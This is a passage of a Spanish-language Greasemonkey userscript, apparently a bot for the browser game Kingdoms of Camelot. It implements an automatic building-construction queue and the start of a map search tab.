            }, false);
        }
    },

	pbHelp : function (){
    var helpText = '<BR>Diseñado para crear colas de autoconstrucción.<BR>';
    helpText += 'Auto Construir ON/OFF---> Activa el Modo construcción auto.<BR>';
    helpText += 'Modo Construir ON/OFF ----> Para Crear la Cola construcción!<BR>';
    helpText += 'Modo construcción ---> Indicamos si queremos Destruir,Subir un Nivel o el Maximo Nivel del edificio en cuestion.<BR><BR>';
	helpText += 'Boton Ver ----> Muestra la cola de construcción de la ciudad en cuestión!<BR>';
	helpText += 'En ocasiones, puede quedarse parada la cola, es cuestion de borrarla y reacerla de nuevo!<BR>';

    var pop = new CPopup ('pbHelp', 0, 0, 585, 230, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda Menu Power Bot: Autoconstructor</b></center>';
    pop.show (true);
  },
	setBuildMode: function (type) {
	    var t = Tabs.build;
		t.currentBuildMode = type;
	},
    e_autoBuild: function(){
      var t = Tabs.build;
	    document.getElementById('pbbuildError').innerHTML = '';
      if (t.buildStates.running == true) {
          var now = unixTime();
//logit ('Seed.queue_con: (now='+ now +')\n'+ inspect (Seed.queue_con, 3));
          for (var i = 0; i < Cities.cities.length; i++) {
              var cityId = Cities.cities[i].id;
              var isBusy = false;
              var qcon = Seed.queue_con["city" + cityId];
              if (matTypeof(qcon)=='array' && qcon.length>0) {
                if (parseInt(qcon[0][4]) > now)
                  isBusy = true;
                else
                  qcon.shift();   // remove expired build from queue
              }
//logit ('City #'+ (i+1) + ' : busy='+ isBusy);
              if (isBusy) {
                  //TODO add info of remaining build time and queue infos
              } else {
                 if (t["bQ_" + cityId].length > 0) { // something to do?
                 	 var bQi = t["bQ_" + cityId][0];   //take first queue item to build
                 	 t.doOne (bQi);;
//					 setTimeout(t.e_autoBuild, 10000); //should be at least 10
//					 return; // we need to make sure that there is enough time for each ajax request to not overwrite the vaule that are needed by the next run
                 }
              }
            }
          }
		setTimeout(t.e_autoBuild, 10000); //should be at least 10
    },
    doOne : function (bQi){
		var t = Tabs.build;
		var currentcityid = parseInt(bQi.cityId);
		var cityName = t.getCityNameById(currentcityid);
		var time = parseInt(bQi.buildingTime);
		var mult = parseInt(bQi.buildingMult);
		var attempt = parseInt(bQi.buildingAttempt);


		//mat/KOC Power Bot: 49 @ 19:41:45.274: Pos: 6 Type: 13 Level: 8 Id: 1523749

 		var mode = bQi.buildingMode;
		//  var mode = "build"; //FOR DEBUG

		var citpos = parseInt(bQi.buildingPos);
		//  var citpos = 6; //FOR DEBUG

		if (Seed.buildings['city' + currentcityid]["pos" + citpos] != undefined && Seed.buildings['city' + currentcityid]["pos" + citpos][0] != undefined) {
		var l_bdgid = parseInt(bQi.buildingType); //JUST FOR CHECK
		var bdgid = parseInt(Seed.buildings['city' + currentcityid]["pos" + citpos][0]);
		//  var bdgid = 13; //FOR DEBUG

		var l_curlvl = parseInt(bQi.buildingLevel); //JUST FOR CHECK
 		var curlvl = parseInt(Seed.buildings['city' + currentcityid]["pos" + citpos][1]);
		//  var curlvl = 8; //FOR DEBUG

		var l_bid = parseInt(bQi.buildingId); //JUST FOR CHECK
		var bid = parseInt(Seed.buildings["city" + currentcityid]["pos" + citpos][3]);
		//  var bid = 1523749; //FOR DEBUG

		if (curlvl > 8 && mode == 'build') {
			t.cancelQueueElement(0, currentcityid, time, false);
			actionLog("Cola de elementos eliminados: El nivel Edificio es igual a 9 o superior!!!");
			return;
		};
		if (isNaN(curlvl)) {
			t.cancelQueueElement(0, currentcityid, time, false);
			actionLog("Found no correct value for current building!!!!");
			return;
 		}
		if (l_bdgid != bdgid) {
			t.cancelQueueElement(0, currentcityid, time, false);
			actionLog("Building Type does not match!!!!");
			return;
		}
		if (l_bid != bid) {
			t.cancelQueueElement(0, currentcityid, time, false);
			actionLog("Building ID does not match!!!!");
			return;
		}
		if (l_curlvl < curlvl) {
				t.cancelQueueElement(0, currentcityid, time, false);
				actionLog("Queue item deleted: Buildinglevel is equal or higher!!!");
				return;
		}
		if (l_curlvl > curlvl && mode == 'build') {
				t.requeueQueueElement(bQi);
				return;
		}

		if (mode == 'destruct') {
			var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
			params.cid = currentcityid;
			params.bid = "";
			params.pos = citpos;
			params.lv = curlvl - 1;
			if (curlvl >= 1) {
				params.bid = bid;
			}
			params.type = bdgid;
			new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/destruct.php" + unsafeWindow.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function(rslt){
					if (rslt.ok) {
						actionLog("Destruyendo " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " en " + cityName);
						Seed.queue_con["city" + currentcityid].push([bdgid, 0, parseInt(rslt.buildingId), unsafeWindow.unixtime(), unsafeWindow.unixtime() + time, 0, time, citpos]);
						if (params.cid == unsafeWindow.currentcityid)
						unsafeWindow.update_bdg();
            if (document.getElementById('pbHelpRequest').checked == true)
							t.bot_gethelp(params.bid, currentcityid);
						  t.cancelQueueElement(0, currentcityid, time, false);
					} else {
						var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
						t.requeueQueueElement(bQi);
						document.getElementById('pbbuildError').innerHTML = errmsg;
						logit(errmsg);
					}
				},
				onFailure: function(){
					document.getElementById('pbbuildError').innerHTML = "Error de conexión destruyendo! Por favor, inténtelo de nuevo más tarde";
				}
			})
		}
		if (mode == 'build') {
			var invalid = false;
			var chk = unsafeWindow.checkreq("bdg", bdgid, curlvl); //check if all requirements are met
			for (var c = 0; c < chk[3].length; c++) {
				if (chk[3][c] == 0) {
					invalid = true;
				}
			}
			if (invalid == false) {
				var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
				params.cid = currentcityid;
				params.bid = "";
				params.pos = citpos;
				params.lv = curlvl + 1;
				if (params.lv > 9){ //make sure that no level 10+ is built
					t.cancelQueueElement(0, currentcityid, time, false);
					actionLog("Cola de elementos eliminados: Trató de construir nivel 10 + building! Por favor, informe si esto sucede!!!");
					return;
				}
				if (params.lv > 1) {
					params.bid = bid;
				}
				params.type = bdgid;

				new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/construct.php" + unsafeWindow.g_ajaxsuffix, {
					method: "post",
					parameters: params,
					onSuccess: function(rslt){
						if (rslt.ok) {
							actionLog("Construyendo " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " Nivel " + params.lv + " en " + cityName);
							Seed.resources["city" + currentcityid].rec1[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][1]) * mult * 3600;
							Seed.resources["city" + currentcityid].rec2[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][2]) * mult * 3600;
							Seed.resources["city" + currentcityid].rec3[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][3]) * mult * 3600;
							Seed.resources["city" + currentcityid].rec4[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][4]) * mult * 3600;
							Seed.citystats["city" + currentcityid].gold[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][5]) * mult;
							Seed.queue_con["city" + currentcityid].push([bdgid, curlvl + 1, parseInt(rslt.buildingId), unsafeWindow.unixtime(),  unsafeWindow.unixtime() + time, 0, time, citpos]);
							if (params.cid == unsafeWindow.currentcityid)
							unsafeWindow.update_bdg();
							if (document.getElementById('pbHelpRequest').checked == true)
								t.bot_gethelp(params.bid, currentcityid);
								t.cancelQueueElement(0, currentcityid, time, false);
						} else {
							var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
							if (rslt.error_code == 103) { // building has already the target level => just  delete
								t.cancelQueueElement(0, currentcityid, time, false);
								actionLog("Cola de elementos eliminados: este nivel de Construcción ya existe o el proceso de construcción ha comenzado!");
							} else {
								t.requeueQueueElement(bQi);
								document.getElementById('pbbuildError').innerHTML = Cities.byID[currentcityid].name +': '+ errmsg + " El Artículo ya fue requerido. Compruebe el número de reintentos.";
							}
							logit(errmsg);
						}
				},
					onFailure: function(){
						document.getElementById('pbbuildError').innerHTML = "Error de conexión durante la construcción! Por favor, inténtelo de nuevo más tarde";
					}
				});
			} else {
				t.requeueQueueElement(bQi); // requeue item if check is invalid
			}
		}
		} else {
			t.cancelQueueElement(0, currentcityid, time, false);
			actionLog("Cola de elementos eliminados: La Construcción no existe!!!");
		}
	},
	requeueQueueElement: function (bQi) {
	    var t = Tabs.build;
		var cityId = bQi.cityId;
		var buildingPos = parseInt(bQi.buildingPos);
		var buildingId = parseInt(bQi.buildingId);
		var buildingLevel = parseInt(bQi.buildingLevel);
		var buildingType = parseInt(bQi.buildingType);
		var buildingTime = parseInt(bQi.buildingTime);
		var buildingMult = parseInt(bQi.buildingMult);
		var buildingAttempts = parseInt(bQi.buildingAttempts);
		var buildingMode = bQi.buildingMode;

		t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts + 1, buildingMult, buildingMode); // requeue item
		t.cancelQueueElement(0, cityId, buildingTime, false); // delete Queue Item
	},
    show: function(){
		var t = Tabs.build;
    },
    bot_buildslot: function(c, a){
        var t = Tabs.build;
		var cityId = t.getCurrentCityId();
        var buildingPos   = c.id.split("_")[1];
        var buildingType  = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][0]);
        var buildingLevel = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
		var buildingId    = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
		if (DEBUG_TRACE) logit("Pos: " + buildingPos + " Type: " + buildingType + " Level: " + buildingLevel + " Id: " + buildingId);
   		var buildingAttempts = 0;
		var loaded_bQ = t["bQ_" + cityId];
		if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
			var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
		} else {
			var current_construction_pos = "";
		}
		if (loaded_bQ.length == 0 && current_construction_pos != "" ) { //check anyway if there is currently build in progess for this specific building
			if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
		} else {
			if (current_construction_pos != "" && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
			for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
				var loadedCity = loaded_bQ[i].cityId;
				var loadedSlot = loaded_bQ[i].buildingPos;
				if (loadedSlot == buildingPos && loadedCity == cityId) {
					buildingLevel += 1;
				}
				if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
					t.modalmessage('Destrucción ya en cola!');
					return;
				}
			}
		}
        if (t.currentBuildMode == "build") {
		    if (buildingLevel >= 9) {
                t.modalmessage('Debido a los requisitos de construcción (DI), los edificios del nivel 10 \ deben ser construidos manualmente.');
                return;
            }
            var buildingMode = "build";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
        if (t.currentBuildMode == "max") {
            var buildingMode = "build";
			for (var bL = buildingLevel; bL <9; bL++) {
				var queueId = loaded_bQ.length;
				var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
				var buildingMult = result[0];
				var buildingTime = result[1];
				queueId = queueId ;
				t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
				t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
			}
        }
        if (t.currentBuildMode == "destruct") {
            var buildingMode = "destruct";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }

    },
	calculateQueueValues: function (cityId, buildingLevel, buildingType, buildingMode) {
	    var t = Tabs.build;
		var now = unixTime();
		if (buildingMode == 'build') {
			var buildingMult = Math.pow(2, buildingLevel);
        }
		if (buildingMode == 'destruct') {
			var buildingMult = Math.pow(2, buildingLevel - 2);
		}

		var knights = Seed.knights["city" + cityId];
		if (knights) {
			var polKniId = parseInt(Seed.leaders['city' + cityId].politicsKnightId);
			if (polKniId) {
				var polValue = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politics);
				var polBoost = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politicsBoostExpireUnixtime);
				if ((polBoost - now) > 0) {
					polValue = parseInt(polValue * 1.25);
				}
			} else {
				polValue = 0;
			}
		} else {
			polValue = 0;
		}

        var buildingTime = unsafeWindow.buildingcost["bdg" + buildingType][7] * buildingMult;
        if (parseInt(buildingType) < 6 && parseInt(buildingType) > 0 && buildingMult == 1) {
            buildingTime = 15;
        }
		if (buildingMode == 'build') {
			buildingTime = parseInt(buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16)));
        }
		if (buildingMode == 'destruct') {
			buildingTime = buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16));
			if (buildingTime % 1 > 0) {
				buildingTime = parseInt(buildingTime);
			}
		}

		var result = new Array(buildingMult, buildingTime);
		return result;
	},
	bot_buildguardian: function(c, a){
        var t = Tabs.build;
		var cityId = t.getCurrentCityId();
        var buildingType  = 50;
		for(i=0; i < Cities.numCities; i++){
			if(Seed.guardian[i].cityId == cityId){
				var buildingLevel = Seed.guardian[i].level;
				break;
			}
		}
		var buildingId    = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
		if (DEBUG_TRACE) logit("Pos: " + buildingPos + " Tipo: " + buildingType + " Nivel: " + buildingLevel + " Id: " + buildingId);
  		var buildingAttempts = 0;
		var loaded_bQ = t["bQ_" + cityId];
		if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
			var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
		} else {
			var current_construction_pos = "";
		}
		if (loaded_bQ.length == 0 && current_construction_pos != "" ) { //check anyway if there is currently build in progess for this specific building
			if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
		} else {
			if (current_construction_pos != "" && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
			for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
				var loadedCity = loaded_bQ[i].cityId;
				var loadedSlot = loaded_bQ[i].buildingPos;
				if (loadedSlot == buildingPos && loadedCity == cityId) {
					buildingLevel += 1;
				}
				if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
					t.modalmessage('Destrucción ya en la cola!');
					return;
				}
			}
		}
        if (t.currentBuildMode == "build") {
		    if (buildingLevel >= 9) {
                t.modalmessage('Debido a los requisitos de construcción (DI), los edificios por encima del nivel 9 \n deben ser construido manualmente.');
                return;
            }
            var buildingMode = "build";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
        if (t.currentBuildMode == "max") {
            var buildingMode = "build";
			for (var bL = buildingLevel; bL <9; bL++) {
				var queueId = loaded_bQ.length;
				var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
				var buildingMult = result[0];
				var buildingTime = result[1];
				queueId = queueId ;
				t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
				t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
			}
        }
        if (t.currentBuildMode == "destruct") {
            var buildingMode = "destruct";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }

    },
	calculateQueueValues: function (cityId, buildingLevel, buildingType, buildingMode) {
	    var t = Tabs.build;
		var now = unixTime();
		if (buildingMode == 'build') {
			var buildingMult = Math.pow(2, buildingLevel);
        }
		if (buildingMode == 'destruct') {
			var buildingMult = Math.pow(2, buildingLevel - 2);
		}

		var knights = Seed.knights["city" + cityId];
		if (knights) {
			var polKniId = parseInt(Seed.leaders['city' + cityId].politicsKnightId);
			if (polKniId) {
				var polValue = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politics);
				var polBoost = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politicsBoostExpireUnixtime);
				if ((polBoost - now) > 0) {
					polValue = parseInt(polValue * 1.25);
				}
			} else {
				polValue = 0;
			}
		} else {
			polValue = 0;
		}

        var buildingTime = unsafeWindow.buildingcost["bdg" + buildingType][7] * buildingMult;
        if (parseInt(buildingType) < 6 && parseInt(buildingType) > 0 && buildingMult == 1) {
            buildingTime = 15;
        }
		if (buildingMode == 'build') {
			buildingTime = parseInt(buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16)));
        }
		if (buildingMode == 'destruct') {
			buildingTime = buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16));
			if (buildingTime % 1 > 0) {
				buildingTime = parseInt(buildingTime);
			}
		}

		var result = new Array(buildingMult, buildingTime);
		return result;
	},
	bot_gethelp: function (f, currentcityid) {
		var t = Tabs.build;
		var city = t.getCityNameById(currentcityid);
	for (i=0;i<Seed.cities.length;i++) {
		if (Seed.cities[i][1]==city) var cityNum=i;
	}
	cityNum++;
	unsafeWindow.citysel_click(document.getElementById('citysel_'+ (cityNum)));
	  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
	  params.bid = f;
	  params.ctrl = 'AskForHelp';
	  params.action = 'getHelpData';
	  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
		  method: "post",
		  parameters: params,
		  onSuccess: function (rslt) {
			unsafeWindow.handleHelpCallback (rslt.data);
		  },
		  onFailure: function (rslt) {
			t.bot_gethelp (f, currentcityid);
			return;
		  },
		  });

	  var a = Seed.queue_con["city" + currentcityid];
	  var e = 0;
	  var d = 0;
	  for (var c = 0; c < a.length; c++) {
		if (parseInt(a[c][2]) == parseInt(f)) {
		  e = parseInt(a[c][0]);
		  d = parseInt(a[c][1]);
		  break
		}
	  }
	  var b = new Array();
	  b.push(["REPLACE_LeVeLbUiLdInG", d]);
	  b.push(["REPLACE_BuIlDiNgNaMe", unsafeWindow.buildingcost["bdg" + e][0]]);
	  b.push(["REPLACE_LeVeLiD", d]);
	  b.push(["REPLACE_AsSeTiD", f]);
	  var g = function(h, i) {
		unsafeWindow.continuation_95(h, i);
		if (!h) {
		  var j = d > 1 ? unsafeWindow.cm.SpeedUpType.upgrade : unsafeWindow.cm.SpeedUpType.build;
		  unsafeWindow.cm.ClientSideCookieManager.setCookie(j, false)
		}
	  };
	  unsafeWindow.common_postToProfile("95", unsafeWindow.Object.cloneFeed(unsafeWindow.template_data_95), unsafeWindow.Object.cloneFeed(unsafeWindow.actionlink_data_95), g, b)
	 },
	addQueueItem: function (cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode) {
	var t = Tabs.build;
		var lbQ = t["bQ_" + cityId];
		lbQ.push({
            cityId: 			cityId,
            buildingPos:		buildingPos,
            buildingType: 		buildingType,
			buildingId: 		buildingId,
            buildingTime: 		buildingTime,
            buildingLevel: 		buildingLevel,
            buildingAttempts: 	buildingAttempts,
			buildingMult: 		buildingMult,
            buildingMode: 		buildingMode
        });
		t.modifyTotalTime(cityId, 'increase', buildingTime); //adjust total Time
	},
    modalmessage: function(message){
	    var t = Tabs.build;
        var timeout = 10000;
        var content = "autocerrar despues de 10sec...<br><br>"
        content += message;
        unsafeWindow.Modal.showAlert(content);
        window.setTimeout('unsafeWindow.Modal.hideModal();', timeout);
    },
	modifyTotalTime: function (cityId, type, buildingTime) {
	    var t = Tabs.build;
		var element = document.getElementById('pbbuildcount_' + cityId);
		var currentCount = parseInt(element.innerHTML);
		if (type == "increase") {
			t['totalTime_' + cityId] = t['totalTime_' + cityId] + buildingTime;
			var currentCount = currentCount + 1;
		}
		if (type == "decrease") {
			t['totalTime_' + cityId] = t['totalTime_' + cityId] - buildingTime;
			var currentCount = currentCount - 1;
		}
		element.innerHTML = currentCount;
		document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(t['totalTime_' + cityId]);
	},
    hide: function(){
        var t = Tabs.build;
		//unsafeWindow.buildslot = t.koc_buildslot; // restore original koc function
    },
    onUnload: function(){
        var t = Tabs.build;
        for (var i = 0; i < Cities.cities.length; i++) {
            //t["bQ_" + Cities.cities[i].id] = []; //clean up if needed
            if (!ResetAll) GM_setValue('bQ_' + getServerId() + '_' + Cities.cities[i].id, JSON2.stringify((t["bQ_" + Cities.cities[i].id])));
         }
        t.saveBuildStates();
    },
    _addTab: function(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode){
		var t = Tabs.build;
        var row = document.getElementById('pbCityQueueContent').insertRow(0);
        row.vAlign = 'top';
        row.insertCell(0).innerHTML = queueId;
        if (buildingMode == "destruct") {
            row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_att.png">';
        }
        else {
            row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_prod.png">';
        }
        row.insertCell(2).innerHTML = unsafeWindow.buildingcost['bdg' + buildingType][0];
        row.insertCell(3).innerHTML = timestr(buildingTime);
		if (buildingMode == "destruct") {
			row.insertCell(4).innerHTML = 0;
        } else {
			row.insertCell(4).innerHTML = buildingLevel + 1; // => target Level
		}
		row.insertCell(5).innerHTML = buildingAttempts;
        row.insertCell(6).innerHTML = '<a class="button20" id="queuecancel_' + queueId + '"><span>Cancelar</span></a>';
        document.getElementById('queuecancel_' + queueId).addEventListener('click', function(){
            t.cancelQueueElement(queueId, cityId, buildingTime, true);
        }, false);
    },
    cancelQueueElement: function(queueId, cityId, buildingTime, showQueue){
        var t = Tabs.build;
        var queueId = parseInt(queueId);
        t["bQ_" + cityId].splice(queueId, 1);
        t.modifyTotalTime(cityId, 'decrease', buildingTime); //adjust total Time

        if (showQueue == true) {
            t.showBuildQueue(cityId, false);
        }
    },
    showBuildQueue: function(cityId, focus){
	    var t = Tabs.build;
	    clearTimeout (t.timer);
        var popBuildQueue = null;
        var cityName = t.getCityNameById(cityId);
        if (t.popBuildQueue == null) {
            t.popBuildQueue = new CPopup('pbbuild_' + cityId, 0, 0, 350, 500, true, function() {clearTimeout (t.timer);});
        }
        var m = '<DIV style="max-height:560px; height:560px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbTabPad" id="pbCityQueueContent">';
        t.popBuildQueue.getMainDiv().innerHTML = '</table></div>' + m;
        t.popBuildQueue.getTopDiv().innerHTML = '<TD width="200px"><B>Cola de construcción de ' + cityName + '</b></td><TD><INPUT id=pbOptimizeByTime type=submit value="Optimizar el tiempo"></td>';
        t.paintBuildQueue(cityId);
        if (focus)
          t.popBuildQueue.show(true);
		document.getElementById('pbOptimizeByTime').addEventListener('click', function(){t.clearBuildQueue();t.paintBuildQueue(cityId, true);}, false);
		t.timer = setTimeout (function() {t.showBuildQueue(cityId, false)}, 45000);
	},
    paintBuildQueue: function(cityId, optimize){
        var t = Tabs.build;
        var lbQ = t["bQ_" + cityId];
		if (optimize == true) {
			lbQ.sort(function(a,b){return a.buildingTime - b.buildingTime});
		}
		t["bQ_" + cityId] = lbQ;
		for (var i = 0; i < lbQ.length; i++) {
			var queueId = i;
			t._addTab(queueId, lbQ[i].cityId, lbQ[i].buildingType, lbQ[i].buildingTime, lbQ[i].buildingLevel, lbQ[i].buildingAttempts, lbQ[i].buildingMode);
        }
    },
	clearBuildQueue: function() {
	    var t = Tabs.build;
		var table = document.getElementById('pbCityQueueContent');
		var rows = table.rows;
		while(rows.length)
			table.deleteRow(rows.length-1);
	},
    getCurrentCityId: function(){ // TODO maybe move as global function to the core application
        if (!unsafeWindow.currentcityid)
            return null;
        return unsafeWindow.currentcityid;
    },
    saveBuildStates: function(){
		var t = Tabs.build;
        var serverID = getServerId();
        GM_setValue('buildStates_' + serverID, JSON2.stringify(t.buildStates));
    },
    readBuildStates: function(){
        var t = Tabs.build;
        var serverID = getServerId();
        s = GM_getValue('buildStates_' + serverID);
        if (s != null) {
            states = JSON2.parse(s);
            for (k in states)
                t.buildStates[k] = states[k];
        }
    },
    toggleStateRunning: function(obj){
		var t = Tabs.build;
        if (t.buildStates.running == true) {
            t.buildStates.running = false;
            t.saveBuildStates();
            obj.value = "Auto Construir = OFF";
        }
        else {
            t.buildStates.running = true;
            t.saveBuildStates();
            obj.value = "Auto Construir = ON";
        }
    },
    toggleStateMode: function(obj){
		var t = Tabs.build;
        if (obj.value == 'Modo Construir = OFF') {
			unsafeWindow.buildslot = t.bot_buildslot; // overwrite original koc function
            var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
			if(guardian.length >0)
				guardian[0].addEventListener('click', t.bot_buildguardian, false);
			obj.value = "Modo Construir = ON";
        }
        else {
			unsafeWindow.buildslot = t.koc_buildslot; // restore original koc function
			var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
			if(guardian.length >0)
				guardian[0].removeEventListener('click', t.bot_buildguardian, false);
			obj.value = "Modo Construir = OFF";
        }
    },
	getCityNameById: function (cityId) {
    return Cities.byID[cityId].name;
	},
}


/********************************* Search Tab *************************************/

/***
TODO: Better search algorithm (circular OR square, always start at center, working outwards)
        Should be separate class (producer/consumer) so auto attack can use it too
**/

Tabs.Search = {
  tabOrder : 2,
  tabLabel : 'Buscar',
  myDiv : null,
  MapAjax : new CMapAjax(),
  MAX_SHOW_WHILE_RUNNING : 250,
  popFirst : true,
  SearchList : [],
  
  init : function (div){
    var t = Tabs.Search;
    var Provinces = {1:{'name':"Tintagel",'x':75,'y':75},
				2:{'name':"Cornwall",'x':225,'y':75},
				3:{'name':"Astolat",'x':375,'y':75},
				4:{'name':"Lyonesse",'x':525,'y':75},
				5:{'name':"Corbenic",'x':675,'y':75},

				6:{'name':"Paimpont",'x':75,'y':225},
				7:{'name':"Cameliard",'x':225,'y':225},
				8:{'name':"Sarras",'x':375,'y':225},
				9:{'name':"Canoel",'x':525,'y':225},
				10:{'name':"Avalon",'x':675,'y':225},

				11:{'name':"Carmathen",'x':75,'y':375},
				12:{'name':"Shallot",'x':225,'y':375},
//				13:{'name':"-------",'x':375,'y':375},
				14:{'name':"Cadbury",'x':525,'y':375},
				15:{'name':"Glastonbury",'x':675,'y':375},

				16:{'name':"Camlamn",'x':75,'y':525},
				17:{'name':"Islas Orcadas(Orkney)",'x':225,'y':525},
				18:{'name':"Dore",'x':375,'y':525},
				19:{'name':"Logres",'x':525,'y':525},
				20:{'name':"Caerleon",'x':675,'y':525},

				21:{'name':"Parmenie",'x':75,'y':675},
				22:{'name':"Bodmin Moor",'x':225,'y':675},
				23:{'name':"Cellwig",'x':375,'y':675},
				24:{'name':"Listeneise",'x':525,'y':675},
				25:{'name':"Albion",'x':675,'y':675}};
    t.selectedCity = Cities.cities[0];
    t.myDiv = div;
    
    m = '<DIV class=ptentry><TABLE width=100% class=pbTab><TR><TD class=pbDetLeft>Buscar: </td><TD width=99%>';
    m += htmlSelector ({0:"Barbaros", 1:"Tierras", 2:"Ciudades"}, null, 'id=pasrcType');
    m += '&nbsp; &nbsp; &nbsp; <span class=pbDetLeft>Estilo de busqueda: &nbsp;';
	m += htmlSelector({square:"Cuadro", circle:"Circulo"}, Options.srcdisttype, 'id=pbsrcdist');
    m += '</span></td></tr><TR><TD class=pbDetLeft>En: </td><TD class=xtab>X=<INPUT id=pasrchX type=text\> &nbsp;Y=<INPUT id=pasrchY type=text\>\
      &nbsp; Radio: <INPUT id=pasrcDist size=3 value=10 /> &nbsp; <SPAN id=paspInXY></span></tr>\
      <TR><TD class=pbDetLeft>O:</td><TD>Por Provincias: <select id="provinceXY"><option>--provincias--</option>';
    for (var i in Provinces)
			m += '<option value="'+i+'">'+Provinces[i].name+'</option>';
    m += '</select></td></tr>';
    m += '<TR><TD colspan=2 align=center><INPUT id=pasrcStart type=submit value="Iniciar Busqueda"/></td></tr>';
    m += '</table></div>\
        <DIV id="pasrcResults" style="height:400px; max-height:400px;"></div>';
    
    t.myDiv.innerHTML = m;
    var psearch = document.getElementById ("pasrcType");
    new CdispCityPicker ('pasrchdcp', document.getElementById ('paspInXY'), true, t.citySelNotify).bindToXYboxes(document.getElementById ('pasrchX'), document.getElementById ('pasrchY'));
    document.getElementById ('provinceXY').addEventListener ('click', function() {
    	  if (this.value >= 1) {
    		  document.getElementById ('pasrchX').value = Provinces[this.value].x;
